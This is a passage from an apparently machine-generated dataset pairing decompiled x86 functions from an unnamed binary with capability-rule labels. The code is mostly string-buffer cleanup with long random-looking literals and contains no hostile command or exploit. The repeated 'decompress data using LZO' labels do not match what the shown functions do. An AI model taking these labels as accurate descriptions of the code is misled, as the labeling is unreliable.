(0xf < uStack108) {\n            iVar2 = iStack128;\n            if ((0xfff < uStack108 + 1) && (iVar2 = *(iStack128 + -4),  0x1f < (iStack128 + -4) - iVar2))\n            goto code_r0x00429306;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack156) {\n            iVar2 = aiStack176[0];\n            if ((0xfff < uStack156 + 1) && (iVar2 = *(aiStack176[0] + -4),  0x1f < (aiStack176[0] + -4) - iVar2))\n            goto code_r0x00429312;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < &stack0xfffffffc) {\n            iVar2 = iStack56;\n            if ((0xfff < &stack0xfffffffd) && (iVar2 = *(iStack56 + -4),  0x1f < (iStack56 + -4) - iVar2))\n            goto code_r0x0042931e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < unaff_EDI) {\n            arg_8h = ppuStack32;\n            if ((0xfff < unaff_EDI + 1) && (arg_8h = *(ppuStack32 + -4),  0x1f < ppuStack32 + (-4 - arg_8h)))\n            goto code_r0x0042932a;\n            fcn.00401a32(arg_8h);\n        }\n        ppuStack32 = ppuStack32 & 0xffffff00;\n        if (0xf < param_4) {\n            iVar2 = unaff_EBP;\n            if ((0xfff < param_4 + 1) && (iVar2 = *(unaff_EBP + -4),  0x1f < (unaff_EBP + -4) - iVar2))\n            goto code_r0x00429336;\n            fcn.00401a32(iVar2);\n        }\n        param_3 = 0;\n        param_4 = 0xf;\n        if (0xf < param_10) {\n            iVar2 = param_5;\n            if ((0xfff < param_10 + 1) && (iVar2 = *(param_5 + -4),  0x1f < (param_5 + -4) - iVar2))\n            goto code_r0x00429342;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack96;\n        return 1;\n    }\n    iVar2 = iStack152;\n    if ((uStack132 + 1 < 0x1000) || (iVar2 = *(iStack152 + -4),  (iStack152 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00429158;\n    }\n    uStack88 = 0;\n    fcn.004047f5();\ncode_r0x00429306:\n    uStack88 = 1;\n    fcn.004047f5();\ncode_r0x00429312:\n    uStack88 = 2;\n    fcn.004047f5();\ncode_r0x0042931e:\n    uStack88 = 3;\n    fcn.004047f5();\ncode_r0x0042932a:\n    uStack88 = 4;\n    fcn.004047f5();\ncode_r0x00429336:\n    uStack88 = 5;\n    fcn.004047f5();\ncode_r0x00429342:\n    uStack88 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 2135
    },
    "00403a71": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00403a71(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_0000001c;\n    uint auStack168 [2];\n    char *pcStack160;\n    uint uStack156;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x414940;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack136 = 0xf;\n    uStack140 = 0;\n    uStack156 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 5;\n    pcStack160 = \"kqeztgglgxcdukhw\";\n    auStack168[0] = 0x10;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x55, iStack60, \"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\"\n                );\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x55, iStack108, \n                 \"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x55, uStack36, \"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\"\n                );\n    if (uStack88 < 0x10) {\ncode_r0x0040ffa3:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x004100b4;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x004100c0;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar1))\n            goto code_r0x004100cc;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar1 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1))\n            goto code_r0x004100d8;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x4ea1ec;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040ffa3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004100b4:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004100c0:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004100cc:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004100d8:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1310
    },
    "00403a76": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403a76(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e240;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < param_1[5]) {\n        iVar1 = *param_1;\n        arg_8h = iVar1;\n        if ((0xfff < param_1[5] + 1U) && (arg_8h = *(iVar1 + -4),  0x1f < (iVar1 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 339
    },
    "00403a8f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00403a8f(uint *param_1, uint32_t param_2)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uchar *unaff_ESI;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_00000018;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_00000058;\n    uint32_t in_stack_0000006c;\n    uint uStack244;\n    uchar uStack240;\n    char *pcStack236;\n    int32_t iStack232;\n    uint uStack216;\n    uint32_t uStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    uchar uStack160;\n    uchar *puStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint32_t uStack136;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uint32_t uStack68;\n    uchar auStack64 [4];\n    uchar *puStack60;\n    uint32_t uStack56;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414910;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    param_1[5] = 0xf;\n    param_1[4] = 6;\n    *param_1 = 0x76657065;\n    *(param_1 + 1) = 0x6174;\n    *(param_1 + 6) = 0;\n    puVar1 = &stack0xffffffe0;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x0040f959:\n        puStack32 = puVar1;\n        in_stack_00000018 = 0;\n        in_stack_0000001c = 0xf;\n        param_2 = param_2 & 0xffffff00;\n        if (0xf < in_stack_00000034) {\n            uStack80 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (uStack80 = *(in_stack_00000020 - 4),  0x1f < (in_stack_00000020 - 4) - uStack80)) goto code_r0x0040fa07;\n            uStack44 = 0x40f99c;\n            fcn.00401a32(uStack80);\n        }\n        in_stack_00000030 = 0;\n        in_stack_00000034 = 0xf;\n        in_stack_00000020 = in_stack_00000020 & 0xffffff00;\n        if (in_stack_0000006c < 0x10) {\ncode_r0x0040f9e5:\n            *in_FS_OFFSET = iStack28;\n            return param_1;\n        }\n        uStack80 = in_stack_00000058;\n        if ((in_stack_0000006c + 1 < 0x1000) ||\n           (uStack80 = *(in_stack_00000058 - 4),  (in_stack_00000058 - 4) - uStack80 < 0x20)) {\n            uStack44 = 0x40f9e2;\n            fcn.00401a32(uStack80);\n            goto code_r0x0040f9e5;\n        }\n    }\n    else {\n        uStack80 = param_2;\n        if ((in_stack_0000001c + 1 < 0x1000) || (uStack80 = *(param_2 - 4),  (param_2 - 4) - uStack80 < 0x20)) {\n            uStack44 = 0x40f956;\n            puStack32 = &stack0xffffffe0;\n            fcn.00401a32(uStack80);\n            puVar1 = puStack32;\n            goto code_r0x0040f959;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0040fa07:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    puStack48 = 0x40fa2c;\n    fcn.004052d1();\n    puStack60 = 0x40fa3c;\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack60 = &stack0x00000014;\n    fcn.004052d1();\n    puStack100 = &stack0xffffff9c;\n    puStack140 = &stack0xffffffc0;\n    iStack88 = 0xffffffff;\n    uStack92 = 0x414920;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    uStack136 = uStack80;\n    puVar1 = &stack0xffffff9c;\n    if (&stack0xfffffffc < 0x10) {\ncode_r0x0040fab4:\n        puStack100 = puVar1;\n        uStack56 = uStack56 & 0xffffff00;\n        if (param_1 < 0x10) {\ncode_r0x0040fafa:\n            *in_FS_OFFSET = iStack96;\n            return 0x1;\n        }\n        puStack140 = unaff_ESI;\n        if ((param_1 + 1U < 0x1000) || (puStack140 = *(unaff_ESI + -4),  unaff_ESI + (-4 - puStack140) < 0x20)) {\n            fcn.00401a32(puStack140);\n            goto code_r0x0040fafa;\n        }\n    }\n    else {\n        uStack136 = uStack56;\n        uVar4 = uStack80;\n        if ((&stack0xfffffffd < 0x1000) ||\n           (uStack136 = *(uStack56 - 4),  uVar4 = uStack136,  (uStack56 - 4) - uStack136 < 0x20)) {\n            puStack100 = &stack0xffffff9c;\n            fcn.00401a32(uStack136);\n            uStack136 = uVar4;\n            puVar1 = puStack100;\n            goto code_r0x0040fab4;\n        }\n        iStack88 = 0;\n        fcn.004047f5();\n    }\n    iStack88 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack156 = &stack0xffffff0c;\n    uStack148 = 0x414930;\n    iStack152 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff68;\n    uStack216 = 0;\n    uStack212 = 0xf;\n    iStack232 = 0;\n    uStack144 = 4;\n    uStack240 = iStack184;\n    pcStack236 = \"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\";\n    uStack244 = 0x5a;\n    fcn.00402f72();\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack144 = 5;\n    fcn.00402f72(0x5a, iStack208, \n                 \"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\");\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack144 = 6;\n    fcn.00402f72(0x5a, uStack160, \n                 \"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\");\n    if (uStack188 < 0x10) {\ncode_r0x0040fc7a:\n        if (0xf < uStack164) {\n            iVar3 = iStack184;\n            if ((0xfff < uStack164 + 1) && (iVar3 = *(iStack184 + -4),  0x1f < (iStack184 + -4) - iVar3))\n            goto code_r0x0040fd46;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack212) {\n            iVar3 = iStack232;\n            if ((0xfff < uStack212 + 1) && (iVar3 = *(iStack232 + -4),  0x1f < (iStack232 + -4) - iVar3))\n            goto code_r0x0040fd52;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack68) {\n            iVar3 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar3 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar3))\n            goto code_r0x0040fd5e;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = iStack152;\n        return NULL;\n    }\n    iVar3 = iStack208;\n    if ((uStack188 + 1 < 0x1000) || (iVar3 = *(iStack208 + -4),  (iStack208 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x0040fc7a;\n    }\n    uStack144 = 0;\n    fcn.004047f5();\ncode_r0x0040fd46:\n    uStack144 = 1;\n    fcn.004047f5();\ncode_r0x0040fd52:\n    uStack144 = 2;\n    fcn.004047f5();\ncode_r0x0040fd5e:\n    uStack144 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 2564
    },
    "00403b48": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00403b48(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c740;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x52);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043545a;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_0000003c) {\n        iVar1 = in_stack_00000028;\n        if ((0xfff < in_stack_0000003c + 1) &&\n           (iVar1 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar1)) {\ncode_r0x0043545a:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 483
    },
    "00403c38": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00403c38(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack84 [4];\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack84;\n    uStack24 = 0x44bff0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    aiStack84[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x27);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x42, uStack36, \"wpmumlojxqhjvybicpgwrzgkdedhzfmmwfthmowxprbwngkwapqjiymieifcnqivjy\");\n    if (uStack40 < 0x10) {\ncode_r0x0041ef37:\n        if (0xf < uStack64) {\n            iVar2 = aiStack84[0];\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(aiStack84[0] + -4),  0x1f < (aiStack84[0] + -4) - iVar2))\n            goto code_r0x0041f018;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000028) {\n            iVar2 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar2 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar2)) goto code_r0x0041f024;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x0041f030;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x9dbf;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0041ef37;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041f018:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0041f024:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0041f030:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 923
    },
    "00403c56": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00403c56(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack124 [2];\n    char *pcStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack124;\n    uStack24 = 0x44cdd0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 4;\n    pcStack116 = \"azpxsstafqjtuptdhcgwesxmumaugvgnczmqoiiootbazddnbqdeocfghjcmycimjgcddupx\";\n    auStack124[0] = 0x48;\n    fcn.00402f72();\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x48, iStack88, \"azpxsstafqjtuptdhcgwesxmumaugvgnczmqoiiootbazddnbqdeocfghjcmycimjgcddupx\");\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x48, uStack36, \"azpxsstafqjtuptdhcgwesxmumaugvgnczmqoiiootbazddnbqdeocfghjcmycimjgcddupx\");\n    if (uStack68 < 0x10) {\ncode_r0x00449c30:\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x00449d14;\n            fcn.00401a32(iVar2);\n        }\n        puStack40[5] = 0xf;\n        puStack40[4] = 3;\n        *puStack40 = 0x707665;\n        if (0xf < uStack92) {\n            iVar2 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar2 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar2))\n            goto code_r0x00449d20;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x00449d2c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack88;\n    if ((uStack68 + 1 < 0x1000) || (iVar2 = *(iStack88 + -4),  (iStack88 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00449c30;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00449d14:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00449d20:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00449d2c:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1122
    },
    "00403cf1": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00403cf1(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000044;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44c3f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"jqpkjugmobscykbwhmbriropkruwkzffbwobhbliwnlukkjcnsrvpqdjipjlo\";\n    auStack96[0] = 0x3d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x1a, uStack36, \"lblrqdmjxgadotbzprmbxnskru\");\n    if (uStack40 < 0x10) {\ncode_r0x0042bb59:\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0042bbee;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000044) {\n            iVar2 = in_stack_00000030;\n            if ((0xfff < in_stack_00000044 + 1) &&\n               (iVar2 = *(in_stack_00000030 + -4),  0x1f < (in_stack_00000030 + -4) - iVar2)) goto code_r0x0042bbfa;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 